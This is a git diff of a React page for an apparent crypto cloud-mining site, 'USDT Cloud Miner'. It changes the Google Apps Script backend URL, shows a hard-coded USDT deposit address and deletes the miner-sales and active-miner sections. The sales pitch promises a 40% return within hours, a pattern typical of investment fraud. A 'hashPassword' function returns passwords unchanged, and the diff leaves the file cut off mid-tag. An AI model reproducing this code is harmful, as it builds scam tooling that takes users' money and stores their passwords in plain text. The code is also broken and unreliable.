@@ -22,7 +22,7 @@
     const { useState, useEffect } = React;
     const { createRoot } = ReactDOM;
 
-    const GOOGLE_SHEETS_API_URL = 'https://script.google.com/macros/s/AKfycbzXwSRvoFFDdCSFJfoj0ZHkR2xyDCle8ImALMdDgH15RWG13h91kx2S5Dj6E-OyHUsE/exec'; // Updated Web App URL
+    const GOOGLE_SHEETS_API_URL = 'https://script.google.com/macros/s/AKfycbzzsiVc_AZ5OXabbEEvmMML9Df9Au_9RkqVBUmiyrnNhThranqNbiXEjbK_4PMJz6iN/exec'; // Updated Web App URL
     const USDT_ADDRESS = 'TLq6qhGHBkzGcGAQaePq7zxdoMEiChqCQC';
 
     const hashPassword = (password) => password;
@@ -704,92 +704,4 @@
               </section>
             )}
 
-            <section className="mb-12">
-              <h2 className="text-3xl font-semibold mb-6 text-center">Choose Your AI Miner</h2>
-              <div className="mb-8">
-                <h3 className="text-2xl font-bold mb-4 text-center text-[#ff00ff]">Exclusive Miners</h3>
-                <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
-                  {exclusiveMiners.map((miner) => {
-                    const profit = miner.bonus ? miner.bonus : (miner.price * 0.4).toFixed(2);
-                    const roiHours = miner.roiSeconds / 3600;
-                    return (
-                      <div
-                        key={miner.id}
-                        className="miner-card bg-gray-800 p-4 rounded-lg exclusive-glow"
-                      >
-                        <h3 className="text-xl font-bold text-[#ff00ff]">{miner.name}</h3>
-                        <p>Price: {miner.price} USDT</p>
-                        <p>Speed: {miner.speed}x</p>
-                        <p>ROI: {profit} USDT / {roiHours} hours</p>
-                        <button
-                          onClick={() => buyMiner(miner)}
-                          className="mt-4 w-full bg-[#ff00ff] text-gray-900 py-2 rounded hover:bg-[#cc00cc]"
-                        >
-                          Buy Now
-                        </button>
-                      </div>
-                    );
-                  })}
-                </div>
-              </div>
-
-              <h3 className="text-2xl font-bold mb-4 text-center">Regular Miners</h3>
-              <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6">
-                {regularMiners.map((miner) => {
-                  const profit = miner.bonus ? miner.bonus : (miner.price * 0.4).toFixed(2);
-                  const roiHours = miner.roiSeconds / 3600;
-                  return (
-                    <div key={miner.id} className="miner-card bg-gray-800 p-4 rounded-lg neon-glow">
-                      <h3 className="text-xl font-bold">{miner.name}</h3>
-                      <p>Price: {miner.price} USDT</p>
-                      <p>Speed: {miner.speed}x</p>
-                      <p>ROI: {profit} USDT / {roiHours} hours</p>
-                      <button
-                        onClick={() => buyMiner(miner)}
-                        className="mt-4 w-full bg-[#00ffcc] text-gray-900 py-2 rounded hover:bg-[#00ccaa]"
-                      >
-                        Buy Now
-                      </button>
-                    </div>
-                  );
-                })}
-              </div>
-            </section>
-
-            <section>
-              <h2 className="text-3xl font-semibold mb-6 text-center">Your Active Miners</h2>
-              {activeMiners.length === 0 ? (
-                <p className="text-center text-gray-400">No active miners. Purchase one to start mining!</p>
-              ) : (
-                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6">
-                  {activeMiners.map((miner, index) => (
-                    <div key={index} className="bg-gray-800 p-4 rounded-lg neon-glow">
-                      <h3 className="text-xl font-bold">{miner.name}</h3>
-                      <p>Price: {miner.price} USDT</p>
-                      <p>Progress: {miner.progress.toFixed(2)}%</p>
-                      <p>Time Remaining: {((100 - miner.progress) / 100 * miner.roiSeconds / 3600).toFixed(2)} hours</p>
-                      <div className="w-full bg-gray-600 rounded h-2 mt-2">
-                        <div
-                          className="bg-[#00ffcc] h-2 rounded"
-                          style={{ width: `${miner.progress}%` }}
-                        ></div>
-                      </div>
-                    </div>
-                  ))}
-                </div>
-              )}
-            </section>
-          </main>
-
-          <footer className="bg-gray-900 p-4 text-center">
-            <p>© 2025 USDT Cloud Miner. All rights reserved.</p>
-          </footer>
-        </div>
-      );
-    };
-
-    const root = createRoot(document.getElementById('root'));
-    root.render(<App />);
-  </script>
-</body>
-</html>
+            <section className="
